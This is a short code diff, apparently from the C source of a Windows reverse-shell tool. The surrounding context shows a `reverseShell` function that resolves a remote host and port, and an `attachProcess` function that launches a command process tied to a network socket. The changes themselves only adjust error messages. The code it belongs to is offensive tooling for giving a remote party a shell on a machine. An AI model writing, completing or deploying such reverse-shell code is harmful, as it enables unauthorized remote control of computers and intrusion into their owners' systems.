@@ -29,6 +29,7 @@ static RS_ERROR attachProcess(SOCKET winsock) {
 
     if (CreateProcess(NULL, CMD, NULL, NULL, TRUE, 0, NULL, NULL,
             &start_proc, &info_proc) == 0) {
+        ERROR_MSG("Could not create proccess <%s>.", CMD);
         return RS_ERROR_CREATE_PROCCESS;
     }
 
@@ -54,7 +55,7 @@ RS_ERROR reverseShell(const char *host, u_short port) {
     char *ip;
 
     if ((Dire = gethostbyname(host)) == NULL) {
-        ERROR_MSG("Could not get host: <%s>\n", host);
+        ERROR_MSG("Could not get host: <%s>", host);
         return RS_ERROR_RESOLVE;
     }
 
